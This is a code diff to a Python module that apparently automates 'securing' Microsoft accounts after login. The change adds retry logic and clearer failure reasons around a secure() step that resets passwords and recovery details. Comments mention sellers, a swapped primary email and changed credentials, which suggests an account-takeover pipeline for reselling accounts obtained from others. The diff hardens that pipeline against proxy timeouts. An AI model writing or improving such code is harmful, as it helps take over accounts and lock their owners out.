@@ -5,9 +5,11 @@ from securing.auth.get_msaauth import get_msaauth
 from securing.utils.secure import secure
 from securing.account_filters import rejection_reason
 from securing.ban_checks import apply_ban_checks
+from securing.utils.proxy import format_exception_reason, is_proxy_transport_error
 
 from database.database import DBConnection
 from discord import Embed
+import asyncio
 import httpx
 import uuid
 import time
@@ -145,23 +147,50 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                 logging.exception("polish_host failed — continuing with existing cookies")
                 print("[!] - polish_host raised; continuing with existing cookies")
             print(f"[~] - Polished MSAAUTH")
-            try:
-                account = await secure(
-                    session = session, 
-                    recovery = recovery,
-                    account_info = account,
-                    command = command
-                )
-            except Exception as exc:
+            # ReadTimeout / proxy flakes mid-secure are common after password
+            # change — retry a few times before giving sellers a soft-fail embed.
+            secure_attempts = 3
+            last_secure_exc: BaseException | None = None
+            for secure_try in range(1, secure_attempts + 1):
+                try:
+                    account = await secure(
+                        session=session,
+                        recovery=recovery,
+                        account_info=account,
+                        command=command,
+                    )
+                    last_secure_exc = None
+                    break
+                except Exception as exc:
+                    last_secure_exc = exc
+                    if is_proxy_transport_error(exc) and secure_try < secure_attempts:
+                        logging.warning(
+                            "secure() %s for %s (attempt %s/%s) — retrying",
+                            exc.__class__.__name__,
+                            email,
+                            secure_try,
+                            secure_attempts,
+                        )
+                        print(
+                            f"[!] - secure() {exc.__class__.__name__} "
+                            f"({secure_try}/{secure_attempts}) — retrying…"
+                        )
+                        await asyncio.sleep(1.5 * secure_try)
+                        continue
+                    break
+
+            if last_secure_exc is not None:
+                exc = last_secure_exc
                 logging.exception("secure() crashed after login for %s", email)
-                print(f"[X] - secure() crashed: {exc.__class__.__name__}: {exc}")
+                detail = format_exception_reason(exc)
+                print(f"[X] - secure() crashed: {detail}")
                 # Keep whatever credentials we already have in account_info
                 if not isinstance(account, dict):
                     raise
                 account.setdefault("microsoft", {})
                 ms = account["microsoft"]
                 if not ms.get("recover_error"):
-                    ms["recover_error"] = f"{exc.__class__.__name__}: {exc}"
+                    ms["recover_error"] = detail
                 # Primary may already be sunny@ — never fall through as a "success"
                 # with an incomplete secure; give sellers the current primary back.
                 creds_changed = bool(rextra) or (
@@ -172,9 +201,17 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                         and "UNVERIFIED" not in str(ms.get("password") or "")
                     )
                 )
+                if is_proxy_transport_error(exc):
+                    reason = (
+                        f"Securing step failed: {detail}. "
+                        "Network/proxy timed out after login — credentials above "
+                        "may already have changed; retry securing."
+                    )
+                else:
+                    reason = f"Securing step failed: {detail}"
                 return _reject_failure(
                     email,
-                    f"Securing step failed: {exc}",
+                    reason,
                     account,
                     credentials_changed=creds_changed,
                 )
